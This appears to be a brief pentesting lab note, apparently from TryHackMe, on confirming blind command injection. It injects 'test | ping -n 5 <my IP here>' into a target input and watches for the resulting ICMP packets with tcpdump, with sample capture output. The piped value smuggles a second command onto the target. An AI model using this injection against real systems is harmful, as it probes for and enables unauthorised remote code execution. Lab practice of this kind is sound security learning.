mostly using this to check if there is RCE

now


we give the input on taget

On target system:
```
test | ping -n 5 <my IP here> 
```

On my local system:
```
tcpdump -i tun0 icmp
```

now after i put he ping command on target system i must get something like this

```
─(root💀kali)-[~/Desktop/THM]
└─# tcpdump -i tun0 icmp               
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
22:24:21.790481 IP 10.10.10.152 > 10.10.14.32: ICMP echo request, id 1, seq 357, length 40
22:24:21.790502 IP 10.10.14.32 > 10.10.10.152: ICMP echo reply, id 1, seq 357, length 40
22:24:22.850391 IP 10.10.10.152 > 10.10.14.32: ICMP echo request, id 1, seq 358, length 40
22:24:22.850426 IP 10.10.14.32 > 10.10.10.152: ICMP echo reply, id 1, seq 358, length 40
22:24:23.866375 IP 10.10.10.152 > 10.10.14.32: ICMP echo request, id 1, seq 359, length 40
22:24:23.866414 IP 10.10.14.32 > 10.10.10.152: ICMP echo reply, id 1, seq 359, length 40
22:24:24.882285 IP 10.10.10.152 > 10.10.14.32: ICMP echo request, id 1, seq 365, length 40
22:24:24.882319 IP 10.10.14.32 > 10.10.10.152: ICMP echo reply, id 1, seq 365, length 40
22:24:25.896877 IP 10.10.10.152 > 10.10.14.32: ICMP echo request, id 1, seq 366, length 40
22:24:25.896904 IP 10.10.14.32 > 10.10.10.152: ICMP echo reply, id 1, seq 366, length 40
```
